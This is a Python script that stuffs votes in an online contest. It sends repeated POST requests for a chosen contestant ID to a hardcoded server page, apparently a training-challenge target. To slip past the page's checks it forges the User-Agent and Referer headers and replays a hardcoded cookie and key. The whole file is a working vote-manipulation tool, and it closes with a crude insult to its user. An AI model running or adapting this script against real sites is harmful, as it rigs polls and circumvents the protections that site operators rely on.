#!/usr/bin/python3
import requests
print("This is an online Voting contest please provide your the ID of the contestor and how many times would you like to vote we'll take care of the rest *WINK ")
a = (input("who to vote for: "))
z = int(input("how any times kind sir?: "))
url = "http://158.69.76.135/level2.php"
ID = a
requests.get(url)
cookies = {
   	'HoldTheDoor': 'cd428504b36317486df32e996c27e35dbab72e73',
	}
headers = {

    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36 OPR/66.0.3515.27',
    'Referer': 'http://158.69.76.135/level2.php',
}
data = {
 'id': ID,
 'holdthedoor': 'Submit',
 'key': 'cd428504b36317486df32e996c27e35dbab72e73'
}
i = 0
while i < z:
	requests.post(url, data=data, cookies=cookies, headers=headers)
	i += 1
print("           DONE! \n     Hope you're happy you lazy fuck")
